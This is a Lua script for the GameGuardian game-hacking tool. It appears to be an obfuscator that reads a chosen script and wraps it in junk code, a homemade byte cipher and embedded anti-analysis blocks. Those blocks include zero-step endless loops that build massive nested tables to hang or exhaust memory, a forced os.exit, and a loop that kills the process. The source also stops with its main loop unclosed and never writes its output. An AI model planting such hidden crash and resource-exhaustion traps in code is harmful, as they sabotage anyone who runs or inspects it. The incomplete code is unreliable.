g = {}
g.last = "/sdcard/"
g.info = nil
g.config = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("[^/]+$") .. "cfg"
g.data = loadfile(g.config)
if g.data ~= nil then
  g.info = g.data()
  g.data = nil
end
if g.info == nil then
  g.info = { g.last, g.last:gsub("/[^/]+$", "") }
end
while true do
  g.info = gg.prompt({
    ' Select file :', -- 1
    'Select folder  :'
  }, g.info, { 
    'file', 
    'path'
  })
  gg.saveVariable(g.info, g.config)
  g.last = g.info[1]
  if loadfile(g.last) == nil then
    gg.alert("Script not Found!")
    return
  else
    g.out = g.last:match("[^/]+$")
    g.out = g.out:gsub(".lua", ".sha")
    g.out = g.info[2] .. "" .. g.out .. ".lua"
     checkk= g.out:match("^.+/(.+)$")
  end
  local file = io.open(g.last, "r")
  local DATA = file:read('*a')
  file:close()
  
  function tempstr(sz,isF)
  sz=sz or math.random(9,79)
  local se=" goto s "
  local sa = " i = ~i i = _ENV[35] i = _ENV[i] i = ~i  i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i  i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i  i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i  i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = _ENV[i] i = ~i  i = ~i i = _ENV[35] i = _ENV[i] i = ~i i = ~i i = _ENV[35] i = ~i "
  local strs=""
  for s=1,sz do
    strs=strs..se
    saa=""..sa  end
  strs=" if(nil)then for i = 1,0 do M = 'BatDev[BG]'if ({}).M~=nil then ({}).M=({}).M() end"..saa.."for i=({}).i ,({}).i ,({}).i do goto s goto s::s::end for i= {}, ({}).i , {} do goto s goto s::s::end for i= {}, {} , iiii do goto s goto s::s::end while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end end if(nil)then "..strs.." ::s:: end for x = 1,0 do if x.x ~= nil then x.x = x.x() end end _={} _.__() _.___() _.____() _._____() end "
return strs end

  
  
Block = ([[

for _a=0,1,0 do local _b={} if _b.a~=nil then _b.d=_b.a() _b.a=nil-_a+_a-_a*_a/nil%_a~_a~~~_a%#_a end _b=nil-_a+_a-_a*_a/nil%_a~_a~~~_a%#_a end

for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end;for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end;for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end;for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
for i = 1,5 do
if(nil)then if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end end
loadfile = loadfile
load = load
loadfile(gg.getFile()) load(string.dump(load("os.exit()"),false,false)) io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") end
S = math.random(1,60)
SPAM = "\\"..S..""
for u = 1,3 do
local i = {" "..SPAM:rep(60000).." "}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {" "..SPAM:rep(60000).." ",xxxxxxxx__,"\000\000\000\000\000\000\000\000",nil} 
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,900,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 800 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 700 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
for u = 1,6 do
local i = {"\n\n\t\t\n"}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,800,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 700 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 600 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
for u = 1,6 do
local i = {"\n\n\t\t\n"}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,800,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 700 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 600 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
for u = 1,6 do
local i = {"\n\n\t\t\n"}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,800,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 700 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 600 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
for u = 1,6 do
local i = {"\n\n\t\t\n"}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,800,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 700 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 600 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
for u = 1,6 do
local i = {"\n\n\t\t\n"}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 1,5 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0,800,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii})
for u = 0, 700 do
xxxxxxxx__ = xxxxxxxx__
local i = {"\n\n\t\t\n",xxxxxxxx__}
local ii = {{i,i,i,i,i},i,i,i,i}
local iii = {{{ii,ii,ii,ii},i,i,i,i},i,ii,i,ii,i}
local iiii = {{{{iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,i,ii,iii}
local iiiii = {{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},ii,ii,ii,ii,ii,ii},i,i,i,i,i,i},i,ii,iii,iiii,iiii,ii,iii,iii}
for u = 0, 600 ,0 do
xxxxxxxx__({{iiii,iiii,iiii,iiii,i},iiii,iiii,iiii,iiii})
xxxxxxxx__({{{iii,ii,iii,iii},i,i,i,i},i,ii,i,ii,i})
xxxxxxxx__( {{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},i,ii,iii,i,ii,iii})
xxxxxxxx__({{{{{iiii,iiii,iiii,iiii,iiii,iiii},iii,iii,iii,iii,iii,iii},iii,iii,iii,iii,iii,iii},i,i,i,i,i,i},iii,iii,iii,iiii,iiii,iii,iii,iii})
                            end
                     end
              end
       end
end
 
]])
gg.setVisible(false)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local Key1 = math.random(1000,2000)
local Key2 = math.random(3000,4000)
local Key3 = math.random(5000,60000)


local inv256
function calculateInv256()
    inv256 = {}
    for M = 1, 100 do
        local inv = 0
        repeat
            inv = inv + 1
        until (inv * (2 * M + 1) % 256) == 1
        inv256[M] = inv
    end
end

function ShaMod(str)
    str = str:gsub("\\n", "\n")
    if not inv256 then calculateInv256() end

    local K, F = Key1, Key2 
    local prime = Key3 
    return (str:gsub('.', function(m)
        local L = K % 256
        local H = (K - L) // 256
        local M = (H % 27) + 1
        local m_byte = m:byte()

        local c = ((m_byte * inv256[M] + (H + prime) * M) % 256)
        K = (L * F + H + c + m_byte) % (prime * 256)
        return ('%02x'):format(c)
    end))
end

local DEC =[[

for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
